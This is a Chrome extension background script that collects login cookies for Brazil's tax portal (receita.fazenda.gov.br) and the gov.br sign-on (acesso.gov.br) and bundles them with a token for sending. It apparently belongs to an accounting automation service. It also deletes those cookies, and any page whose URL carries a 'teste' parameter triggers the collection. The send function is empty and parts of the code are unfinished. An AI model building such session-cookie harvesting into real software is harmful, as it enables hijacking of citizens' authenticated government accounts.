const botHosts = {remote: "https://api.contador.cloud", local: "https://localhost:8000"};
const actions = {
    send: body => {

    },
    cookiesEat: domains => {
        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = [];
            jars.forEach(jar => cookies = jar.result.concat(cookies));

            return Promise.all(promises.cookiesEat(cookies));
        });
    },
    cookiesEatReload: (domains, to) => {
        actions.cookiesEat(domains)
        .then(results => chrome.tabs.update(doThis.tabId, {"url": to}));
    },
    cookiesGetAllSend: domains => {
        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = {};
            jars.forEach(jar => {
                cookies[jar.domain] = jar.result;
            });

            actions.send({token: doThis.token, cookies: cookies});
        });
    },
    contextMenu: () => {
        // TODO: use update and remove.
        chrome.contextMenus.create({
            "id": id,
            "title": title,
            "documentUrlPatterns": [
                "http://*/*",
                "https://*/*"
            ]
        });
    },
    alert: (title, message, interation = true) => {
        chrome.notifications.create("contadorCloudCookiesAlert", {
            type:'basic',
            iconUrl: "icon.png",
            message: message,
            title: title,
            requireInteraction: interation
        });
    }
};
const promises = {
    /*dom: (actions, tabId) => {
        const promises = [];
        const results = {id: "dom", result: {}};
        actions.forEach(action => {
            promises.push(chrome.scripting.executeScript({target: {tabId: tabId}, func: action}).then(frames => {
                frames.forEach(frame => {
                    if (!frame.result) return;

                    results.result[frame.result.name] = frame.result.value;
                });
                return result;
            }));
        });
        return promises;
    },*/
    cookiesGetAll: domains => {
        const promises = [];
        domains.forEach(domain => {
            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
                return {
                    method: "cookiesGetAll",
                    domain: domain,
                    result: cookies
                };
            }));
        });
        return promises;
    },
    cookiesEat: cookies => {
        const promises = [];
        cookies.forEach(cookie => {
            const url = cookie => {
                if (cookie.domain.charAt(0) === ".")
                    cookie.domain = cookie.domain.replace(".", "");

                return "https://" + cookie.domain + cookie.path;
            };
            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
                // cookie contains only name, storeId and url.
                return {
                    method: "cookiesEat",
                    result: cookie
                };
            }));
        });
        return promises;
    }
};
let doThis = [
    {
        url: "https://www.google.com?cookiesEatReload",
        action: {
            name: "cookiesEatReload",
            args: [
                ["receita.fazenda.gov.br", "acesso.gov.br"],
                "https://cav.receita.fazenda.gov.br/autenticacao/login"
            ]
        }
    },
    {
        url: "https://sso.acesso.gov.br/login?client_id=cav.receita.fazenda.gov.br&authorization_id=",
        action: {
            name: "cookiesGetAllSend",
            args: [["receita.fazenda.gov.br", "acesso.gov.br"]]
        }
    }
];

/**
 * Executes on every page load. All of them.
 */
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete') return;

    const url = new URL(tab.url);
    const hasJob = () => {
        const starting = () => {
            if (!url.searchParams.has("botToken"))
                return;

            return doThis = {
                jobs: url.searchParams.get("botDoThis"),
                tabId: tabId,
                token: url.searchParams.get("botToken")
            };
        };
        const forThisPage = () => {
            if (!doThis)
                return;

            if (tab.url.includes(doThis.jobs[0].url))
                return true;
        }
        if (starting() || forThisPage())
            return true;
    };



    const teste = url.searchParams.has("teste");
    const domains = ["receita.fazenda.gov.br", "acesso.gov.br"];
    if (teste)
        actions.cookiesGetAllSend(domains);
});

//chrome.contextMenus.onClicked.addListener((info, tab) => runAction("onUserTrigger"));
